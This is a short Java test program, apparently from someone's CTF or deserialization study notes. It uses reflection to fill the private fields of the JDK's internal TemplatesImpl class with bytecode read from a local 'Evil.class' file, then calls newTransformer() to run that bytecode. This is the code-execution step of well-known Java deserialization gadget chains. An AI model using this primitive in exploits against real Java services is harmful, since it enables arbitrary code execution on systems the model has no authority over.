package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TemplatesImplTest {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Field _nameField = TemplatesImpl.class.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesImpl,"aaa");
        Field _bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\tmp\\Evil.class"));
        byte[][] codes={code};
        _bytecodesField.set(templatesImpl,codes);
        Field _tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templatesImpl,new TransformerFactoryImpl());

        templatesImpl.newTransformer();
    }
}
